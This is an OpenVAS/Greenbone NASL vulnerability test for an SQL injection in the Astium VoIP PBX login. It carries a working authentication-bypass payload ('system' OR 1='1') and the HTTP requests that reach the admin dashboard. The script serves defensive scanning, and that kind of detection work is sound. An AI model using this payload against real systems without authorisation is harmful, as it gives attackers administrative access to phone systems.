# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103631");
  script_version("2023-12-13T05:05:23+0000");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_name("Astium VoIP PBX SQL Injection Vulnerability");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/23831/");

  script_tag(name:"last_modification", value:"2023-12-13 05:05:23 +0000 (Wed, 13 Dec 2023)");
  script_tag(name:"creation_date", value:"2013-01-02 15:53:02 +0100 (Wed, 02 Jan 2013)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_dependencies("find_service.nasl", "httpver.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"Astium VoIP PBX is prone to an SQL-injection vulnerability because the
  application fails to properly sanitize user-supplied input before
  using it in an SQL query.

  A successful exploit could allow an attacker to compromise the
  application, access or modify data, or exploit vulnerabilities in the
  underlying database.

  Astium VoIP PBX <= v2.1 build 25399 is vulnerable. Other versions may also be affected.");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("host_details.inc");
include("misc_func.inc");

port = http_get_port(default:80);
if(!http_can_host_php(port:port))
  exit(0);

url = '/index.php?js=0ctest=1&test=1&ctest=1';
req = http_get(item:url, port:port);
buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if(buf !~ "HTTP/1.. 302" || "Location" >!< buf || "astiumnls" >!< buf) exit(0);

astiumnls = eregmatch(pattern:"Location:.*index.php\?astiumnls=([a-z0-9]+)", string:buf);
if(isnull(astiumnls[1]))exit(0);

vtstrings = get_vt_strings();
password = vtstrings["lowercase"];

ex = "astiumnls=" + astiumnls[1] + "&__act=submit&user_name=system%27+OR+1%3D%271&pass_word=" + password + "&submit=Login";
len = strlen(ex);

host = http_host_name(port:port);

req = string("POST /en/logon.php HTTP/1.1\r\n",
             "Host: ", host,"\r\n",
             "Connection: Close\r\n",
             "Referer: http://",host,url,"\r\n",
             "Cookie: testcookie=test; astiumnls=",astiumnls[1],"; mypanel=up\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: ",len,"\r\n",
             "\r\n",
             ex);
buf = http_send_recv(port:port, data:req, bodyonly:FALSE);

if(buf !~ "HTTP/1.. 302" || "Location" >!< buf || "dashboard.php" >!< buf) exit(0);

req = string("GET /en/database/dashboard.php HTTP/1.1\r\n",
             "Host:",host,"\r\n",
             "Connection: Close\r\n",
             "Cookie: testcookie=test; astiumnls=",astiumnls[1],"; mypanel=up\r\n\r\n");

buf = http_send_recv(port:port, data:req, bodyonly:FALSE);

if("system admin's Dashboard" >< buf) {
  security_message(port:port);
  exit(0);
}

exit(0);
